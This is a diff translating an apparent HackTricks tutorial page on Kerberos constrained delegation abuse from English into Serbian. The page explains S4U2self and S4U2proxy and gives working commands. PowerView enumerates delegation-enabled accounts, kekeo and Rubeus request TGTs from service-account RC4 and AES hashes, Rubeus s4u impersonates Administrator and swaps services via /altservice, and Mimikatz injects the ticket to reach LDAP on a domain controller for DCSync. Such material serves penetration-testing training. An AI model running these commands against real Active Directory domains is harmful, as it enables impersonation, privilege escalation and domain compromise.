@@ -1,22 +1,21 @@
-# Constrained Delegation
+# Ograničena Delegacija
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Constrained Delegation
+## Ograničena Delegacija
 
-Using this a Domain admin can **allow** a computer to **impersonate a user or computer** against a **service** of a machine.
+Korišćenjem ovoga, administrator domena može **dozvoliti** računaru da **imituje korisnika ili računar** protiv **usluge** mašine.
 
-- **Service for User to self (**_**S4U2self**_**):** If a **service account** has a _userAccountControl_ value containing [TRUSTED_TO_AUTH_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), then it can obtain a TGS for itself (the service) on behalf of any other user.
-- **Service for User to Proxy(**_**S4U2proxy**_**):** A **service account** could obtain a TGS on behalf any user to the service set in **msDS-AllowedToDelegateTo.** To do so, it first need a TGS from that user to itself, but it can use S4U2self to obtain that TGS before requesting the other one.
+- **Usluga za korisnika da se sam (**_**S4U2self**_**):** Ako **račun usluge** ima _userAccountControl_ vrednost koja sadrži [TRUSTED_TO_AUTH_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), onda može dobiti TGS za sebe (uslugu) u ime bilo kog drugog korisnika.
+- **Usluga za korisnika da proxy(**_**S4U2proxy**_**):** **Račun usluge** može dobiti TGS u ime bilo kog korisnika za uslugu postavljenu u **msDS-AllowedToDelegateTo.** Da bi to uradio, prvo mu je potreban TGS od tog korisnika za sebe, ali može koristiti S4U2self da dobije taj TGS pre nego što zatraži drugi.
 
-**Note**: If a user is marked as ‘_Account is sensitive and cannot be delegated_ ’ in AD, you will **not be able to impersonate** them.
+**Napomena**: Ako je korisnik označen kao ‘_Račun je osetljiv i ne može biti delegiran_’ u AD, nećete **moći da imitirate** njih.
 
-This means that if you **compromise the hash of the service** you can **impersonate users** and obtain **access** on their behalf to the **service configured** (possible **privesc**).
+To znači da ako **kompromitujete hash usluge** možete **imitirati korisnike** i dobiti **pristup** u njihovo ime do **konfigurisane usluge** (moguća **privesc**).
 
-Moreover, you **won't only have access to the service that the user is able to impersonate, but also to any service** because the SPN (the service name requested) is not being checked, only privileges. Therefore, if you have access to **CIFS service** you can also have access to **HOST service** using `/altservice` flag in Rubeus.
+Štaviše, **nećete imati samo pristup usluzi koju korisnik može imitirati, već i bilo kojoj usluzi** jer se SPN (ime usluge koja se zahteva) ne proverava, samo privilegije. Stoga, ako imate pristup **CIFS usluzi** možete takođe imati pristup **HOST usluzi** koristeći `/altservice` flag u Rubeus-u.
 
-Also, **LDAP service access on DC**, is what is needed to exploit a **DCSync**.
-
+Takođe, **pristup LDAP usluzi na DC-u**, je ono što je potrebno za eksploataciju **DCSync**.
 ```bash:Enumerate
 # Powerview
 Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
@@ -44,12 +43,10 @@ tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31
 tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
 .\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
 ```
-
 > [!WARNING]
-> There are **other ways to obtain a TGT ticket** or the **RC4** or **AES256** without being SYSTEM in the computer like the Printer Bug and unconstrain delegation, NTLM relaying and Active Directory Certificate Service abuse
+> Postoje **drugi načini da se dobije TGT tiket** ili **RC4** ili **AES256** bez da budete SYSTEM na računaru, kao što su Printer Bug i nekontrolisana delegacija, NTLM preusmeravanje i zloupotreba Active Directory Certificate Service.
 >
-> **Just having that TGT ticket (or hashed) you can perform this attack without compromising the whole computer.**
-
+> **Samo posedujući taj TGT tiket (ili heš) možete izvršiti ovaj napad bez kompromitovanja celog računara.**
 ```bash:Using Rubeus
 #Obtain a TGS of the Administrator user to self
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
@@ -77,8 +74,6 @@ tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.mo
 #Load the TGS in memory
 Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
 ```
-
-[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
+[**Više informacija na ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
 
 {{#include ../../banners/hacktricks-training.md}}
-
